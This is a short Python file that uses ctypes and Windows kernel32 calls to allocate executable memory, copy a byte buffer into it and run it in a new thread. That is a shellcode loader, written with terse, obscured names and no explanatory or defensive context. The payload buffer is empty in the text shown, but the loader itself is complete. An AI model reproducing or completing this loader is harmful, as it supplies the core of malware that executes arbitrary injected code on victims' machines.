import ctypes as kk


def O():
    
    b_x = b""
    
    kk.windll.kernel32.VirtualAlloc.restype = kk.c_void_p
    kk.windll.kernel32.CreateThread.argtypes = (
        kk.c_int, kk.c_int, kk.c_void_p, kk.c_int, kk.c_int, kk.POINTER(kk.c_int)
    )

    spc = kk.windll.kernel32.VirtualAlloc(
        kk.c_int(0), kk.c_int(len(b_x)), kk.c_int(0x3000), kk.c_int(0x40)
    )
    bf = (kk.c_char * len(b_x)).from_buffer_copy(b_x)
    kk.windll.kernel32.RtlMoveMemory(kk.c_void_p(spc), bf, kk.c_int(len(b_x)))
    hndl = kk.windll.kernel32.CreateThread(
        kk.c_int(0), kk.c_int(0), kk.c_void_p(spc), kk.c_int(0), kk.c_int(0),
        kk.pointer(kk.c_int(0))
    )
    kk.windll.kernel32.WaitForSingleObject(hndl, kk.c_uint32(0xffffffff))
